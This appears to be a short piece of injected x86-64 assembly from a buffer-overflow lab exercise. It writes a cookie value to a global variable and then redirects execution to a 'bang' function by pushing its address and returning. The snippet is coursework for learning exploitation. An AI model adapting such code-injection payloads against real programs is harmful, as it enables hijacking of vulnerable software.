movq $0x283bd98f2116c61a,%rsi # move cookie to register
movq %rsi,(0x602308) # move cookie to global_value
pushq $0x401020 # push bang address to stack
retq # return
